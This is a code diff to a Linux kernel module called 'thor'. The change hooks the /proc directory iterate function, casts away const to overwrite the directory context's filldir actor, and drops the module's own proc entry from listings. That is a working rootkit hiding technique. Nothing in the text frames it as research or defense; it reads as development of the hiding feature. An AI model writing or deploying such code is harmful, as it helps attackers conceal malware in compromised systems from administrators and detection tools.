@@ -29,10 +29,7 @@ static struct proc_dir_entry *procfile;
 static struct proc_dir_entry *procroot;
 static struct file_operations *proc_fops;
 static int (*orig_proc_iterate)(struct file *, struct dir_context *);
-static struct dir_context *orig_dir_ctx = NULL;
-static struct dir_context thor_dir_ctx = {
-    .actor = thor_proc_filldir,
-};
+static int (*orig_proc_filldir)(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
 static struct file_operations procfile_fops = {
     .owner = THIS_MODULE,
     .open = procfile_open,
@@ -120,19 +117,19 @@ static ssize_t procfile_write(struct file *file, const char __user *buffer,
 // ------------------------------------------------------------ PROCROOT
 static int thor_proc_iterate(struct file *file, struct dir_context *ctx)
 {
-#if 0
-    orig_dir_ctx = ctx;
-    thor_dir_ctx.pos = ctx->pos;
-    return orig_proc_iterate(file, &thor_dir_ctx);
-#else
+    // capture original filldir function
+    orig_proc_filldir = ctx->actor;
+    // cast away const from ctx->actor
+    filldir_t *ctx_actor = (filldir_t*)(&ctx->actor);
+    // store our filldir in ctx->actor
+    *ctx_actor = thor_proc_filldir;
     return orig_proc_iterate(file, ctx);
-#endif
 }
 
 static int thor_proc_filldir(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
 {
     if (0 == strcmp(name, THOR_PROCFILE)) return 0;
-    return orig_dir_ctx->actor(buf, name, namelen, offset, ino, d_type);
+    return orig_proc_filldir(buf, name, namelen, offset, ino, d_type);
 }
 
 // ------------------------------------------------------------ CLEANUP
